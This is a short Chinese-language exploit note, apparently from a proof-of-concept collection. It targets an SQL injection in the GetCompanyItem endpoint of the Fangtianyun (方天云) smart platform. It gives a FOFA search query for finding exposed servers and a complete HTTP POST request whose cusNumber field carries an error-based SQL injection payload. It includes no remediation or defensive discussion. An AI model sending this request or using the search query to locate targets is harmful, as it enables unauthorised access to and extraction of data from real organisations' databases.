 # 方天云智慧平台系统GetCompanyItem存在sql注入漏洞



## fofa

```yaml
body="AjaxMethods.asmx/GetCompanyItem"
```

## poc

```
POST /AjaxMethods.asmx/GetCompanyItem HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 41
Connection: close

{cusNumber:"1' and 2=user--+"}
```

